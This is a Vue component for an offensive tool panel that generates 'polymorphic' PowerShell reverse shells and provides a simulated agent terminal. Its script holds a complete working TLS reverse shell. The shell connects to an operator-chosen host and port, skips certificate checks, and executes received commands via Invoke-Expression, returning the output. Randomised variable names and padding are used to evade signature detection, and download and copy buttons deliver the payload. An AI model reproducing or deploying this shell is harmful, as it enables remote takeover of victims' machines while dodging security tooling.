<template>
  <div class="terminal-view">
    <div class="terminal-header">
      <h1>PowerShell Terminal</h1>
      <p>Polymorphic Reverse Shell Generator & Command Execution</p>
    </div>

    <!-- Terminal Tabs -->
    <el-tabs v-model="activeTab" type="card" class="terminal-tabs">
      <!-- Shell Generator Tab -->
      <el-tab-pane label="Shell Generator" name="generator">
        <div class="shell-generator">
          <el-form :model="shellConfig" label-width="120px" class="shell-form">
            <el-row :gutter="20">
              <el-col :span="12">
                <el-form-item label="Target IP:">
                  <el-input v-model="shellConfig.targetIP" placeholder="192.168.1.100" />
                </el-form-item>
              </el-col>
              <el-col :span="12">
                <el-form-item label="Target Port:">
                  <el-input v-model="shellConfig.targetPort" placeholder="4444" />
                </el-form-item>
              </el-col>
            </el-row>
            
            <el-row :gutter="20">
              <el-col :span="12">
                <el-form-item label="Shell Type:">
                  <el-select v-model="shellConfig.shellType" placeholder="Select shell type">
                    <el-option label="PowerShell Reverse" value="powershell" />
                    <el-option label="PowerShell VNC" value="vnc" />
                  </el-select>
                </el-form-item>
              </el-col>
              <el-col :span="12">
                <el-form-item label="Polymorphic Level:">
                  <el-select v-model="shellConfig.polymorphicLevel" placeholder="Select level">
                    <el-option label="ASCII → Bytes → B64" value="ascii-bytes-b64" />
                  </el-select>
                </el-form-item>
              </el-col>
            </el-row>

            <el-form-item>
              <el-button type="primary" @click="generateShell" :loading="generating">
                <el-icon><Setting /></el-icon>
                Generate Polymorphic Shell
              </el-button>
              <el-button @click="clearShell">
                <el-icon><Delete /></el-icon>
                Clear
              </el-button>
            </el-form-item>
          </el-form>

          <!-- Generated Shell Output -->
          <div v-if="generatedShell" class="shell-output">
            <h3>Generated Shell Code:</h3>
            <div class="code-container">
              <el-input
                v-model="generatedShell"
                type="textarea"
                :rows="15"
                readonly
                class="shell-code"
              />
              <div class="code-actions">
                <el-button type="success" @click="copyToClipboard">
                  <el-icon><CopyDocument /></el-icon>
                  Copy to Clipboard
                </el-button>
                <el-button type="warning" @click="downloadShell">
                  <el-icon><Download /></el-icon>
                  Download as .ps1
                </el-button>
              </div>
            </div>
          </div>
        </div>
      </el-tab-pane>

      <!-- Live Terminal Tab -->
      <el-tab-pane label="Live Terminal" name="live">
        <div class="live-terminal">
          <div class="terminal-controls">
            <el-button type="primary" @click="connectTerminal" :disabled="terminalConnected">
              <el-icon><Connection /></el-icon>
              Connect to Agent
            </el-button>
            <el-button type="danger" @click="disconnectTerminal" :disabled="!terminalConnected">
              <el-icon><Close /></el-icon>
              Disconnect
            </el-button>
            <el-button @click="clearTerminal">
              <el-icon><Delete /></el-icon>
              Clear Terminal
            </el-button>
          </div>

          <!-- Terminal Output -->
          <div class="terminal-output" ref="terminalOutput">
            <div v-for="(line, index) in terminalLines" :key="index" class="terminal-line">
              <span class="prompt" v-if="line.type === 'input'">PS ></span>
              <span class="output" v-else>{{ line.content }}</span>
            </div>
          </div>

          <!-- Command Input -->
          <div class="terminal-input">
            <el-input
              v-model="currentCommand"
              placeholder="Enter PowerShell command..."
              @keyup.enter="executeCommand"
              :disabled="!terminalConnected"
              class="command-input"
            >
              <template #append>
                <el-button @click="executeCommand" :disabled="!terminalConnected">
                  <el-icon><Right /></el-icon>
                </el-button>
              </template>
            </el-input>
          </div>
        </div>
      </el-tab-pane>

      <!-- Shell History Tab -->
      <el-tab-pane label="Shell History" name="history">
        <div class="shell-history">
          <div class="history-controls">
            <el-button type="primary" @click="refreshHistory">
              <el-icon><Refresh /></el-icon>
              Refresh History
            </el-button>
            <el-button type="danger" @click="clearHistory">
              <el-icon><Delete /></el-icon>
              Clear History
            </el-button>
          </div>

          <el-table :data="shellHistory" style="width: 100%" class="history-table">
            <el-table-column prop="timestamp" label="Timestamp" width="180" />
            <el-table-column prop="targetIP" label="Target IP" width="120" />
            <el-table-column prop="targetPort" label="Port" width="80" />
            <el-table-column prop="shellType" label="Shell Type" width="120" />
            <el-table-column label="Actions" width="150">
              <template #default="scope">
                <el-button size="small" @click="viewHistoryItem(scope.row)">
                  <el-icon><View /></el-icon>
                  View
                </el-button>
                <el-button size="small" type="danger" @click="deleteHistoryItem(scope.row)">
                  <el-icon><Delete /></el-icon>
                </el-button>
              </template>
            </el-table-column>
          </el-table>
        </div>
      </el-tab-pane>
    </el-tabs>
  </div>
</template>

<script setup lang="ts">
import { ref, reactive, onMounted, nextTick } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'

// Terminal state
const activeTab = ref('generator')
const generating = ref(false)
const terminalConnected = ref(false)
const currentCommand = ref('')
const terminalLines = ref<Array<{ type: 'input' | 'output', content: string }>>([])
const terminalOutput = ref<HTMLElement>()

// Shell configuration
const shellConfig = reactive({
  targetIP: '',
  targetPort: '4444',
  shellType: 'powershell',
  polymorphicLevel: 'ascii-bytes-b64'
})

// Generated shell and history
const generatedShell = ref('')
const shellHistory = ref<Array<{
  id: string
  timestamp: string
  targetIP: string
  targetPort: string
  shellType: string
  code: string
}>>([])

// Generate polymorphic shell
const generateShell = async () => {
  if (!shellConfig.targetIP || !shellConfig.targetPort) {
    ElMessage.error('Please provide target IP and port')
    return
  }

  generating.value = true
  
  try {
    // Simulate shell generation (replace with actual polymorphic logic)
    await new Promise(resolve => setTimeout(resolve, 1000))
    
    const shellCode = generatePolymorphicShell(shellConfig)
    generatedShell.value = shellCode
    
    // Save to history
    const historyItem = {
      id: Date.now().toString(),
      timestamp: new Date().toLocaleString(),
      targetIP: shellConfig.targetIP,
      targetPort: shellConfig.targetPort,
      shellType: shellConfig.shellType,
      code: shellCode
    }
    
    shellHistory.value.unshift(historyItem)
    saveHistoryToStorage()
    
    ElMessage.success('Polymorphic shell generated successfully!')
  } catch (error) {
    ElMessage.error('Failed to generate shell: ' + error)
  } finally {
    generating.value = false
  }
}

// Generate polymorphic shell code using the actual PowerShell generator
const generatePolymorphicShell = (config: any): string => {
  const { targetIP, targetPort, shellType } = config
  
  let shellCode = ''
  
  if (shellType === 'powershell') {
    // Generate the actual PowerShell reverse shell using your generator logic
    shellCode = generatePowerShellReverseShell(targetIP, parseInt(targetPort))
  } else if (shellType === 'vnc') {
    // PowerShell VNC implementation (placeholder for now)
    shellCode = `# PowerShell VNC Connection
$ip = "${targetIP}"
$port = ${targetPort}

# VNC connection logic would go here
# This is a placeholder for VNC functionality
Write-Host "VNC connection to $ip\`:$port would be established here"
Write-Host "Replace this with your actual VNC implementation"`
  }
  
  return shellCode
}

// Your actual PowerShell reverse shell generator based on here.ps1
const generatePowerShellReverseShell = (lhost: string, lport: number): string => {
  // Generate random signatures for obfuscation (same as here.ps1)
  const generateSignatures = () => {
    const prefixes = ["Net", "Conn", "Data", "Stream", "Buffer", "Output", "Input", "Client", "Server", "Remote", "Socket", "Channel", "Link", "Bridge", "Flow", "Pipe"]
    const suffixes = ["Handler", "Manager", "Reader", "Writer", "Stream", "Buffer", "Client", "Data", "Flow", "Pipe", "Store", "Cache", "Hold", "Temp", "Core", "Base"]
    
    const signatures: any = {}
    const keys = ['LHOST', 'LPORT', 'TCPClient', 'TlsStream', 'StreamReader', 'StreamWriter', 'Buffer', 'Code', 'Output', 'ActualTls', 'MinChunk', 'MaxChunk', 'MinDelay', 'MaxDelay']
    
    keys.forEach(key => {
      const prefix = prefixes[Math.floor(Math.random() * prefixes.length)]
      const suffix = suffixes[Math.floor(Math.random() * suffixes.length)]
      signatures[key] = prefix + suffix
    })
    
    const paddingWords = ["obfuscated", "randomized", "secured", "encoded", "protected", "stealth", "cloaked", "masked"]
    const count = Math.floor(Math.random() * 3) + 1
    const selectedWords = paddingWords.sort(() => 0.5 - Math.random()).slice(0, count)
    signatures['Padding'] = "# " + selectedWords.join(" ")
    
    return signatures
  }
  
  const sigs = generateSignatures()
  
  // Generate random values like in here.ps1
  const minChunkVal = Math.floor(Math.random() * 256) + 256
  const maxChunkVal = Math.floor(Math.random() * 512) + minChunkVal + 512
  const minDelayVal = Math.floor(Math.random() * 40) + 10
  const maxDelayVal = Math.floor(Math.random() * 350) + minDelayVal + 50
  
  // Variable names from signatures
  const vLHOST = sigs['LHOST']
  const vLPORT = sigs['LPORT']
  const vTCPClient = sigs['TCPClient']
  const vTlsStream = sigs['TlsStream']
  const vStreamReader = sigs['StreamReader']
  const vStreamWriter = sigs['StreamWriter']
  const vBuffer = sigs['Buffer']
  const vCode = sigs['Code']
  const vOutput = sigs['Output']
  const vActualTls = sigs['ActualTls']
  const vMinChunk = sigs['MinChunk']
  const vMaxChunk = sigs['MaxChunk']
  const vMinDelay = sigs['MinDelay']
  const vMaxDelay = sigs['MaxDelay']
  
  // Generate the PowerShell code as a string (based on here.ps1)
  return `${sigs['Padding']}
# Advanced TLS Reverse Shell - Auto TLS 1.3/1.2 with Robust Connection Handling
# Smart TLS version detection and setup - TLS 1.3 with automatic fallback to TLS 1.2
$${vActualTls} = "TLS 1.2"
try {
    # Attempt TLS 1.3 first (modern security)
    $tls13Supported = $false
    try {
        $tls13Field = [System.Net.SecurityProtocolType].GetField('Tls13')
        if ($tls13Field -ne $null) {
            $osVersion = [System.Environment]::OSVersion.Version
            $build = [System.Environment]::OSVersion.Version.Build
            
            # Check OS compatibility (Windows 10 2004+ or Server 2022+)
            if (($osVersion.Major -gt 10) -or ($osVersion.Major -eq 10 -and $build -ge 19041)) {
                $psVersion = $PSVersionTable.PSVersion.Major
                
                # Try to enable TLS 1.3
                if ($psVersion -ge 7) {
                    # PowerShell 7+ has better TLS 1.3 support
                    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls13 -bor [System.Net.SecurityProtocolType]::Tls12
                    $${vActualTls} = "TLS 1.3"
                    $tls13Supported = $true
                } else {
                    # PowerShell 5.1 - attempt TLS 1.3 with fallback
                    try {
                        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls13 -bor [System.Net.SecurityProtocolType]::Tls12
                        $${vActualTls} = "TLS 1.3"
                        $tls13Supported = $true
                    } catch {
                        $tls13Supported = $false
                    }
                }
            }
        }
    } catch {
        $tls13Supported = $false
    }
    
    # Fallback to TLS 1.2 if TLS 1.3 not supported
    if (-not $tls13Supported) {
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        $${vActualTls} = "TLS 1.2 (fallback)"
    }
} catch {
    # Final fallback to TLS 1.2
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    $${vActualTls} = "TLS 1.2 (error fallback)"
}

# SSL/TLS configuration
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {
    param($sender, $certificate, $chain, $sslPolicyErrors)
    return $true
}
[System.Net.ServicePointManager]::CheckCertificateRevocationList = $false
[System.Net.ServicePointManager]::Expect100Continue = $false

$${vLHOST} = "${lhost}"
$${vLPORT} = ${lport}
$${vMinChunk} = ${minChunkVal}
$${vMaxChunk} = ${maxChunkVal}
$${vMinDelay} = ${minDelayVal}
$${vMaxDelay} = ${maxDelayVal}

$global:CleanupInProgress = $false
$global:GracefulShutdown = $false
$global:ConnectionActive = $false

# CTRL+C Handler for graceful shutdown
try {
    [Console]::TreatControlCAsInput = $false
    Register-EngineEvent PowerShell.Exiting -Action {
        if (-not $global:CleanupInProgress -and -not $global:GracefulShutdown) {
            $global:CleanupInProgress = $true
            $global:ConnectionActive = $false
            
            try {
                # Send termination notice
                if ($${vStreamWriter} -and $${vTlsStream} -and $${vTlsStream}.CanWrite) {
                    $${vStreamWriter}.WriteLine("[!] Connection terminated by user")
                    $${vStreamWriter}.Flush()
                }
                
                # TLS shutdown sequence
                if ($${vTlsStream} -and $${vTlsStream}.IsAuthenticated) {
                    try {
                        $${vTlsStream}.ShutdownAsync().Wait(1000)  # 1 second timeout
                    } catch {}
                }
                
                # Close streams
                if ($${vStreamWriter}) { $${vStreamWriter}.Dispose() }
                if ($${vStreamReader}) { $${vStreamReader}.Dispose() }
                
                # TCP graceful close
                if ($${vTCPClient} -and $${vTCPClient}.Connected) {
                    $socket = $${vTCPClient}.Client
                    try {
                        $socket.Shutdown([System.Net.Sockets.SocketShutdown]::Send)
                        Start-Sleep -Milliseconds 100
                        $socket.Shutdown([System.Net.Sockets.SocketShutdown]::Both)
                        Start-Sleep -Milliseconds 50
                    } catch {}
                    $${vTCPClient}.Close()
                }
            } catch {}
        }
    } | Out-Null
} catch {}

try {
    # Create TcpClient with robust configuration
    $${vTCPClient} = New-Object Net.Sockets.TcpClient
    $socket = $${vTCPClient}.Client
    
    # Configure socket before connection
    $socket.ReceiveTimeout = -1  # Infinite timeout
    $socket.SendTimeout = 30000  # 30 second timeout for sends
    $socket.NoDelay = $true
    $socket.ReceiveBufferSize = 65536
    $socket.SendBufferSize = 65536
    
    # Connect with timeout
    $connectTask = $${vTCPClient}.ConnectAsync($${vLHOST}, $${vLPORT})
    $connected = $connectTask.Wait(10000)  # 10 second timeout
    
    if (-not $connected -or -not $${vTCPClient}.Connected) {
        throw "Connection failed or timed out"
    }
    
    # Additional socket configuration after connection
    $socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::KeepAlive, $true)
    $socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Tcp, [System.Net.Sockets.SocketOptionName]::NoDelay, $true)
    
    # Get network stream
    $networkStream = $${vTCPClient}.GetStream()
    $networkStream.ReadTimeout = -1  # Infinite read timeout
    $networkStream.WriteTimeout = 30000  # 30 second write timeout
    
    # Create TLS stream with robust configuration
    $${vTlsStream} = New-Object System.Net.Security.SslStream(
        $networkStream, 
        $false, 
        ([System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $sslPolicyErrors)
            return $true
        })
    )
    
    # TLS Authentication with smart protocol selection
    try {
        if ($${vActualTls}.StartsWith("TLS 1.3")) {
            # Try TLS 1.3 first, fallback to 1.2
            try {
                $enabledProtocols = [System.Security.Authentication.SslProtocols]::Tls13 -bor [System.Security.Authentication.SslProtocols]::Tls12
                $${vTlsStream}.AuthenticateAsClient($${vLHOST}, $null, $enabledProtocols, $false)
            } catch {
                # Fallback to TLS 1.2
                $${vTlsStream}.AuthenticateAsClient($${vLHOST}, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false)
                $${vActualTls} = "TLS 1.2 (auth fallback)"
            }
        } else {
            # Use TLS 1.2
            $${vTlsStream}.AuthenticateAsClient($${vLHOST}, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false)
        }
    } catch {
        # Final fallback to basic authentication
        $${vTlsStream}.AuthenticateAsClient($${vLHOST})
        $${vActualTls} = "TLS 1.2 (basic auth)"
    }
    
    # Verify TLS is working
    if (-not $${vTlsStream}.IsAuthenticated) {
        throw "TLS authentication failed"
    }
    
    # Create stream readers/writers with proper encoding and buffering
    $${vStreamReader} = New-Object System.IO.StreamReader($${vTlsStream}, [System.Text.Encoding]::UTF8, $false, 4096)
    $${vStreamWriter} = New-Object System.IO.StreamWriter($${vTlsStream}, [System.Text.Encoding]::UTF8, 4096)
    $${vStreamWriter}.AutoFlush = $false  # Manual flush for better control
    
    $global:ConnectionActive = $true
    
} catch {
    # Comprehensive cleanup on connection failure
    if ($${vStreamWriter}) { try { $${vStreamWriter}.Dispose() } catch {} }
    if ($${vStreamReader}) { try { $${vStreamReader}.Dispose() } catch {} }
    if ($${vTlsStream}) { try { $${vTlsStream}.Dispose() } catch {} }
    if ($networkStream) { try { $networkStream.Dispose() } catch {} }
    if ($${vTCPClient}) { try { $${vTCPClient}.Close() } catch {} }
    
    Write-Host "[!] Connection failed to $${vLHOST}::$${vLPORT}" -ForegroundColor Red
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
    return
}

# Simple send function with error handling
function Send-Data {
    param([string]$data)
    
    if (-not $global:ConnectionActive -or $global:CleanupInProgress) {
        return $false
    }
    
    try {
        if ($${vTlsStream} -and $${vTlsStream}.CanWrite -and $${vStreamWriter}) {
            $${vStreamWriter}.Write($data)
            $${vStreamWriter}.Flush()
            return $true
        }
    } catch {
        $global:ConnectionActive = $false
        return $false
    }
    return $false
}

# Robust read function with timeout handling
function Read-Command {
    try {
        if (-not $global:ConnectionActive -or $global:CleanupInProgress -or -not $${vStreamReader}) {
            return $null
        }
        
        # Check if data is available
        $attempts = 0
        while ($attempts -lt 100 -and $global:ConnectionActive) {
            try {
                if ($${vTCPClient}.Available -gt 0) {
                    return $${vStreamReader}.ReadLine()
                }
            } catch {
                $global:ConnectionActive = $false
                return $null
            }
            Start-Sleep -Milliseconds 100
            $attempts++
        }
        return $null
    } catch {
        $global:ConnectionActive = $false
        return $null
    }
}

# Send initial connection message
$connectMsg = "\\n[+] $${vActualTls} Shell Connected as $env:username@$env:computername\\n"
$connectMsg += "[*] Chunk: ${minChunkVal}-${maxChunkVal} bytes | Delay: ${minDelayVal}-${maxDelayVal} ms\\n"
$connectMsg += "[*] Protocol: $${vActualTls} | PowerShell: $($PSVersionTable.PSVersion)\\n"
$connectMsg += "[!] Auto TLS 1.3 with fallback enabled\\n"
$connectMsg += "[!] To close: type 'exit'\\nPS > "

if (-not (Send-Data $connectMsg)) {
    if (-not $global:CleanupInProgress) {
        try {
            if ($${vStreamWriter}) { $${vStreamWriter}.Dispose() }
            if ($${vStreamReader}) { $${vStreamReader}.Dispose() }
            if ($${vTlsStream}) { $${vTlsStream}.Dispose() }
            if ($${vTCPClient}) { $${vTCPClient}.Close() }
        } catch {}
    }
    return
}

# Main command loop with robust error handling
try {
    while ($global:ConnectionActive -and -not $global:CleanupInProgress) {
        $command = Read-Command
        
        if ($command -eq $null) {
            # No command received, connection might be closed
            if (-not $global:ConnectionActive) { break }
            continue
        }
        
        if ($command -eq "exit" -or $command -eq "quit") {
            # Enhanced exit handling to prevent empty segments
            try {
                Send-Data "\\n[*] Exiting shell...\\n"
                Start-Sleep -Milliseconds 300  # Give time for message to be received
                
                # Mark as graceful shutdown
                $global:GracefulShutdown = $true
                
                # Stop reading loop immediately 
                $global:ConnectionActive = $false
                break
            } catch {
                # Fallback to immediate cleanup if graceful fails
                $global:ConnectionActive = $false
                break
            }
        }
        
        # Execute command with proper error handling
        try {
            $result = ""
            if (-not [string]::IsNullOrWhiteSpace($command)) {
                $output = Invoke-Expression $command 2>&1 | Out-String
                if (-not [string]::IsNullOrWhiteSpace($output)) {
                    $result = $output
                }
            }
            
            # Send result back
            if (-not [string]::IsNullOrEmpty($result)) {
                if (-not (Send-Data $result)) { break }
            }
            if (-not (Send-Data "\\nPS > ")) { break }
            
        } catch {
            $errorMsg = "Error: $($_.Exception.Message)\\nPS > "
            if (-not (Send-Data $errorMsg)) { break }
        }
    }
} catch {
    # Main loop error
    $global:ConnectionActive = $false
} finally {
    # Cleanup
    if ($${vStreamWriter}) { try { $${vStreamWriter}.Dispose() } catch {} }
    if ($${vStreamReader}) { try { $${vStreamReader}.Dispose() } catch {} }
    if ($${vTlsStream}) { try { $${vTlsStream}.Dispose() } catch {} }
    if ($${vTCPClient} -and $${vTCPClient}.Connected) {
        try {
            $${vTCPClient}.Close()
        } catch {}
    }
    
    try {
        Unregister-Event -SourceIdentifier "PowerShell.Exiting" -Force -ErrorAction SilentlyContinue
    } catch {}
}`
}

// Terminal functions
const connectTerminal = () => {
  terminalConnected.value = true
  addTerminalLine('output', 'Connected to agent terminal. Ready for commands.')
  addTerminalLine('output', 'Type "exit" to disconnect.')
}

const disconnectTerminal = () => {
  terminalConnected.value = false
  addTerminalLine('output', 'Disconnected from agent terminal.')
}

const executeCommand = () => {
  if (!currentCommand.value.trim()) return
  
  addTerminalLine('input', currentCommand.value)
  
  // Simulate command execution (replace with actual agent communication)
  setTimeout(() => {
    const output = `Command executed: ${currentCommand.value}`
    addTerminalLine('output', output)
  }, 500)
  
  currentCommand.value = ''
}

const addTerminalLine = (type: 'input' | 'output', content: string) => {
  terminalLines.value.push({ type, content })
  
  // Auto-scroll to bottom
  nextTick(() => {
    if (terminalOutput.value) {
      terminalOutput.value.scrollTop = terminalOutput.value.scrollHeight
    }
  })
}

const clearTerminal = () => {
  terminalLines.value = []
}

// History functions
const refreshHistory = () => {
  loadHistoryFromStorage()
  ElMessage.success('History refreshed')
}

const clearHistory = async () => {
  try {
    await ElMessageBox.confirm('Are you sure you want to clear all shell history?', 'Clear History', {
      confirmButtonText: 'Clear All',
      cancelButtonText: 'Cancel',
      type: 'warning'
    })
    
    shellHistory.value = []
    localStorage.removeItem('shellHistory')
    ElMessage.success('History cleared')
  } catch {
    // User cancelled
  }
}

const viewHistoryItem = (item: any) => {
  generatedShell.value = item.code
  activeTab.value = 'generator'
  ElMessage.success('Shell code loaded from history')
}

const deleteHistoryItem = async (item: any) => {
  try {
    await ElMessageBox.confirm('Delete this history item?', 'Delete Item', {
      confirmButtonText: 'Delete',
      cancelButtonText: 'Cancel',
      type: 'warning'
    })
    
    shellHistory.value = shellHistory.value.filter(h => h.id !== item.id)
    saveHistoryToStorage()
    ElMessage.success('History item deleted')
  } catch {
    // User cancelled
  }
}

// Utility functions
const copyToClipboard = async () => {
  try {
    await navigator.clipboard.writeText(generatedShell.value)
    ElMessage.success('Shell code copied to clipboard')
  } catch (error) {
    ElMessage.error('Failed to copy to clipboard')
  }
}

const downloadShell = () => {
  const blob = new Blob([generatedShell.value], { type: 'text/plain' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  a.download = `shell_${shellConfig.targetIP}_${shellConfig.targetPort}.ps1`
  document.body.appendChild(a)
  a.click()
  document.body.removeChild(a)
  URL.revokeObjectURL(url)
  ElMessage.success('Shell code downloaded')
}

const clearShell = () => {
  generatedShell.value = ''
  shellConfig.targetIP = ''
  shellConfig.targetPort = '4444'
  shellConfig.shellType = 'powershell'
  shellConfig.polymorphicLevel = 'ascii-bytes-b64'
}

// Storage functions
const saveHistoryToStorage = () => {
  localStorage.setItem('shellHistory', JSON.stringify(shellHistory.value))
}

const loadHistoryFromStorage = () => {
  const stored = localStorage.getItem('shellHistory')
  if (stored) {
    try {
      shellHistory.value = JSON.parse(stored)
    } catch (error) {
      console.error('Failed to load shell history:', error)
    }
  }
}

// Initialize
onMounted(() => {
  loadHistoryFromStorage()
  addTerminalLine('output', 'Terminal ready. Connect to an agent to begin.')
})
</script>

<style scoped lang="scss">
.terminal-view {
  padding: 20px;
  height: 100%;
  background: var(--primary-black);
  color: var(--text-white);
}

.terminal-header {
  text-align: center;
  margin-bottom: 30px;
  
  h1 {
    color: var(--text-white);
    margin: 0 0 10px 0;
    font-size: 28px;
  }
  
  p {
    color: var(--text-gray);
    margin: 0;
    font-size: 16px;
  }
}

.terminal-tabs {
  background: var(--secondary-black);
  border-radius: 8px;
  padding: 20px;
  
  :deep(.el-tabs__header) {
    margin-bottom: 20px;
  }
  
  :deep(.el-tabs__item) {
    color: var(--text-gray);
    
    &.is-active {
      color: var(--primary-color);
    }
  }
}

/* Dark theme for all components */
:deep(.el-tabs__content) {
  background: var(--secondary-black);
  border: 1px solid var(--border-color);
  border-radius: 8px;
  padding: 20px;
}

/* Form styling */
:deep(.el-form-item__label) {
  color: var(--text-white) !important;
}

:deep(.el-input__inner) {
  background: var(--primary-black) !important;
  border-color: var(--border-color) !important;
  color: var(--text-white) !important;
}

:deep(.el-select .el-input__inner) {
  background: var(--primary-black) !important;
  border-color: var(--border-color) !important;
  color: var(--text-white) !important;
}

:deep(.el-textarea__inner) {
  background: var(--primary-black) !important;
  border-color: var(--border-color) !important;
  color: var(--text-white) !important;
}

/* Select dropdowns */
:deep(.el-select-dropdown) {
  background: var(--secondary-black) !important;
  border-color: var(--border-color) !important;
}

:deep(.el-select-dropdown__item) {
  color: var(--text-white) !important;
}

:deep(.el-select-dropdown__item:hover) {
  background: var(--primary-black) !important;
}

:deep(.el-select-dropdown__item.selected) {
  background: var(--primary-color) !important;
  color: var(--text-white) !important;
}

/* Buttons */
:deep(.el-button) {
  color: var(--text-white) !important;
}

:deep(.el-button--primary) {
  background-color: var(--primary-color) !important;
  border-color: var(--primary-color) !important;
}

:deep(.el-button--success) {
  background-color: #67c23a !important;
  border-color: #67c23a !important;
}

:deep(.el-button--warning) {
  background-color: #e6a23c !important;
  border-color: #e6a23c !important;
}

:deep(.el-button--danger) {
  background-color: #f56c6c !important;
  border-color: #f56c6c !important;
}

/* Default button (Clear button) */
:deep(.el-button:not([type])) {
  background-color: #e6a23c !important;
  border-color: #e6a23c !important;
  color: var(--text-white) !important;
}

:deep(.el-button:not([type]):hover) {
  background-color: #d48806 !important;
  border-color: #d48806 !important;
}

/* Ensure all buttons in terminal are readable */
.live-terminal .terminal-controls .el-button {
  background-color: var(--secondary-black) !important;
  border-color: var(--border-color) !important;
  color: var(--text-white) !important;
}

.live-terminal .terminal-controls .el-button:hover {
  background-color: var(--primary-black) !important;
  border-color: var(--primary-color) !important;
}

.live-terminal .terminal-controls .el-button[type="primary"] {
  background-color: var(--primary-color) !important;
  border-color: var(--primary-color) !important;
}

.live-terminal .terminal-controls .el-button[type="danger"] {
  background-color: #f56c6c !important;
  border-color: #f56c6c !important;
}

/* Table styling */
:deep(.el-table) {
  background: transparent !important;
  color: var(--text-white) !important;
}

:deep(.el-table__header) {
  background: var(--primary-black) !important;
}

:deep(.el-table__header th) {
  background: var(--primary-black) !important;
  color: var(--text-white) !important;
  border-bottom: 1px solid var(--border-color) !important;
}

:deep(.el-table__body) {
  background: transparent !important;
}

:deep(.el-table__body td) {
  background: transparent !important;
  color: var(--text-white) !important;
  border-bottom: 1px solid var(--border-color) !important;
}

:deep(.el-table__body tr:hover > td) {
  background: var(--primary-black) !important;
}

.shell-generator {
  .shell-form {
    margin-bottom: 30px;
    
    .el-form-item {
      margin-bottom: 20px;
    }
  }
  
  .shell-output {
    h3 {
      color: var(--text-white);
      margin-bottom: 15px;
    }
    
    .code-container {
      .shell-code {
        margin-bottom: 15px;
        
        :deep(.el-textarea__inner) {
          background: var(--primary-black) !important;
          color: #00ff00 !important;
          font-family: 'Courier New', monospace;
          font-size: 14px;
          border: 1px solid var(--border-color) !important;
        }
      }
      
      .code-actions {
        display: flex;
        gap: 10px;
        justify-content: center;
      }
    }
  }
}

.live-terminal {
  .terminal-controls {
    margin-bottom: 20px;
    display: flex;
    gap: 10px;
  }
  
  .terminal-output {
    background: var(--primary-black);
    border: 1px solid var(--border-color);
    border-radius: 4px;
    padding: 15px;
    height: 400px;
    overflow-y: auto;
    margin-bottom: 20px;
    font-family: 'Courier New', monospace;
    
    .terminal-line {
      margin-bottom: 5px;
      
      .prompt {
        color: #00ff00;
        font-weight: bold;
        margin-right: 10px;
      }
      
      .output {
        color: var(--text-white);
      }
    }
  }
  
  .terminal-input {
    .command-input {
      :deep(.el-input__inner) {
        background: var(--primary-black) !important;
        color: var(--text-white) !important;
        border: 1px solid var(--border-color) !important;
        font-family: 'Courier New', monospace;
      }
    }
  }
}

.shell-history {
  .history-controls {
    margin-bottom: 20px;
    display: flex;
    gap: 10px;
  }
  
  .history-table {
    :deep(.el-table) {
      background: transparent;
      color: var(--text-white);
      
      .el-table__header {
        background: var(--secondary-black);
      }
      
      .el-table__body {
        background: transparent;
      }
      
      .el-table__row {
        background: transparent;
        
        &:hover {
          background: var(--secondary-black);
        }
      }
    }
  }
}

// Responsive design
@media (max-width: 768px) {
  .terminal-view {
    padding: 10px;
  }
  
  .terminal-tabs {
    padding: 15px;
  }
  
  .shell-form {
    .el-row {
      .el-col {
        margin-bottom: 15px;
      }
    }
  }
}
</style>
